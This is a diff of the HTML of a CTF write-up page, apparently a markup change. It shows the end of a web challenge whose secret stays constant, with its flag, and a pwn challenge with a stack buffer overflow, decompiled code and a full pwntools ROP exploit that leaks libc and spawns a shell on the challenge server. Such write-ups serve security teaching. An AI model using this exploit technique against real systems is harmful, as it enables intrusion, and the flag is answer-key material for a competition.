+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">secret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">id</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Database</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">db</span><span class="p">.</span><span class="nx">createNote</span><span class="p">({</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s1">&#39;public&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/create&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">data</span> <span class="o">??</span> <span class="s1">&#39;no data provided.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">token</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createNote</span><span class="p">({</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="sb">`/note?id=</span><span class="si">${</span><span class="nx">id</span><span class="si">}</span><span class="sb">&amp;token=</span><span class="si">${</span><span class="nx">token</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/note&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">token</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">note</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">getNote</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">id</span><span class="o">:</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">id</span> <span class="o">??</span> <span class="s1">&#39;-1&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">token</span><span class="o">:</span> <span class="p">(</span><span class="nx">token</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">note</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">note</span><span class="p">.</span><span class="nx">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">note</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;listening on port 3000&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>The bug is on the secret generation, where they forgot to put <code>()</code>, hence the secret is always the same (because <code>crypto.randomUUID</code> value will be constant, consist of the function implementation). We only need to run the docker, and we will be able to get the correct token for the note id 0/
-<p class="markdown-image">
-  <img src="https://i.imgur.com/XQQLrZC.png" alt=""  />
-</p></p>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.imgur.com/XQQLrZC.png"
+        data-srcset="https://i.imgur.com/XQQLrZC.png, https://i.imgur.com/XQQLrZC.png 1.5x, https://i.imgur.com/XQQLrZC.png 2x"
+        data-sizes="auto"
+        alt="https://i.imgur.com/XQQLrZC.png"
+        title="https://i.imgur.com/XQQLrZC.png" /></p>
 <blockquote>
 <p>Flag: dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}</p>
 </blockquote>
-<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
-<h2 id="interview-opportunity">interview-opportunity <a href="#interview-opportunity" class="anchor">#</a></h2>
+<h1 id="pwn">Pwn</h1>
+<h2 id="interview-opportunity">interview-opportunity</h2>
 <p>We were given a binary file and libc file. Using Ghidra, we can see the decompiled code.</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">main</span>(undefined4 param_1,undefined8 param_2)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_22 [<span style="color:#f60">10</span>];
-</span></span><span style="display:flex;"><span>  undefined8 local_18;
-</span></span><span style="display:flex;"><span>  undefined4 local_c;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  local_18 <span style="color:#555">=</span> param_2;
-</span></span><span style="display:flex;"><span>  local_c <span style="color:#555">=</span> param_1;
-</span></span><span style="display:flex;"><span>  env_setup();
-</span></span><span style="display:flex;"><span>  printf(
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#34;Thank you for you interest in applying to DiceGang. We need great pwners like you to contin ue our traditions and competition against perfect blue.</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>
-</span></span><span style="display:flex;"><span>        );
-</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;So tell us. Why should you join DiceGang?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
-</span></span><span style="display:flex;"><span>  read(<span style="color:#f60">0</span>,local_22,<span style="color:#f60">0x46</span>);
-</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Hello: &#34;</span>);
-</span></span><span style="display:flex;"><span>  puts(local_22);
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_22</span> <span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">local_c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="n">param_2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_c</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">env_setup</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;Thank you for you interest in applying to DiceGang. We need great pwners like you to contin ue our traditions and competition against perfect blue.</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;So tell us. Why should you join DiceGang?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_22</span><span class="p">,</span><span class="mh">0x46</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hello: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="n">local_22</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>There is buffer overflow bug. We just need to leak the base address, and then ROP the binary to execve address (that we found from the help of one_gadget).
-<p class="markdown-image">
-  <img src="https://i.imgur.com/7obzXOo.png" alt=""  />
-</p></p>
+</div><p>There is buffer overflow bug. We just need to leak the base address, and then ROP the binary to execve address (that we found from the help of one_gadget).</p>
+<img src="https://i.imgur.com/7obzXOo.png">
 <p>Below is the full solution</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
-</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main <span style="color:#555">=</span> <span style="color:#f60">0x401240</span>
-</span></span><span style="display:flex;"><span>puts_plt <span style="color:#555">=</span> <span style="color:#f60">0x401030</span>
-</span></span><span style="display:flex;"><span>puts_got <span style="color:#555">=</span> <span style="color:#f60">0x404018</span>
-</span></span><span style="display:flex;"><span>execve <span style="color:#555">=</span> <span style="color:#f60">0xcbd20</span> <span style="color:#09f;font-style:italic"># rsi null, rdi null</span>
-</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#555">=</span> p64(<span style="color:#f60">0x0000000000401313</span>) <span style="color:#09f;font-style:italic"># pop rdi; ret;</span>
-</span></span><span style="display:flex;"><span>pop_rsi_r15 <span style="color:#555">=</span> p64(<span style="color:#f60">0x0000000000401311</span>) <span style="color:#09f;font-style:italic"># pop rsi; pop r15; ret;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span>(<span style="color:#f60">0x1a</span><span style="color:#555">+</span><span style="color:#f60">8</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> pop_rdi <span style="color:#555">+</span> p64(puts_got)
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(puts_plt)
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(main)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;mc.ax&#39;</span>, <span style="color:#f60">31081</span>)
-</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(r<span style="color:#555">.</span>readrepeat(<span style="color:#f60">1</span>))
-</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendline(payload)
-</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>))
-</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>))
-</span></span><span style="display:flex;"><span>puts_addr <span style="color:#555">=</span> u64(r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip()<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
-</span></span><span style="display:flex;"><span>base_addr <span style="color:#555">=</span> puts_addr <span style="color:#555">-</span> <span style="color:#f60">0x00000000000765f0</span> <span style="color:#09f;font-style:italic"># readelf -s libc.so.6| grep &#34;puts&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Puts addr: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(puts_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Base addr: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(base_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
-</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(r<span style="color:#555">.</span>readrepeat(<span style="color:#f60">1</span>))
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span>(<span style="color:#f60">0x1a</span><span style="color:#555">+</span><span style="color:#f60">8</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> pop_rsi_r15 <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>) <span style="color:#555">+</span> p64(<span style="color:#f60">0</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(base_addr <span style="color:#555">+</span> execve)
-</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendline(payload)
-</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="mh">0x401240</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x401030</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x404018</span>
+</span></span><span class="line"><span class="cl"><span class="n">execve</span> <span class="o">=</span> <span class="mh">0xcbd20</span> <span class="c1"># rsi null, rdi null</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401313</span><span class="p">)</span> <span class="c1"># pop rdi; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401311</span><span class="p">)</span> <span class="c1"># pop rsi; pop r15; ret;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1a</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mc.ax&#39;</span><span class="p">,</span> <span class="mi">31081</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span>
